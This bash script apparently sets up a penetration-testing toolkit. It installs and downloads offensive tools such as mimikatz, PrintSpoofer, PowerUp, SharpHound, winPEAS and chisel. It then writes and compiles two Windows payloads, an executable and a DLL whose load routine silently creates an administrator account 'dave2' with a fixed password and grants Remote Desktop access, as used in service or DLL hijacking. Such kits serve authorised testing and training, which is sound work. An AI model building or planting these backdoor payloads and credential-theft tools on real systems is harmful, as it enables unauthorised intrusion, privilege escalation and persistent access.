#! /bin/bash
sudo apt update
sudo apt-get update
sudo apt -y install peass
sudo apt -y install gobuster
sudo apt -y install seclists
sudo apt -y install mingw-w64
sudo apt -y install keepass2
sudo apt -y install chisel
sudo apt -y install neo4j
sudo apt -y install bloodhound
sudo apt -y install snmp-mibs-downloader
pip install uploadserver
pip install paramiko
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz
mv chisel_1.9.1_windows_amd64 chisel.exe
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O printspoofer.exe
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat -O winpeas.bat
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1 -O winpeas.ps1
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Seatbelt.exe -O seatbelt4.7.exe
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Seatbelt.exe -O seatbelt4.5.exe
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Seatbelt.exe -O seatbelt4.0.exe
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
wget https://nmap.org/dist/nmap-7.92-win32.zip -O nmap.zip
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
cp /usr/share/windows-resources/binaries/nc.exe .
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 .
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
cp /usr/share/peass/linpeas/linpeas.sh .
cp /usr/share/peass/winpeas/winPEASany.exe winpeas.exe
echo "#include <stdlib.h>
int main ()
{
  int i;
  
  i = system (\"net user dave2 password123! /add\");
  i = system (\"net localgroup administrators dave2 /add\");
  i = system (\"NET LOCALGROUP \\\"Remote Desktop Users\\\" dave2 /ADD\");
  
  return 0;
}" > adduser.c
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

echo "#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system (\"net user dave2 password123! /add\");
  	    i = system (\"net localgroup administrators dave2 /add\");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}" > adduser.cpp
x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
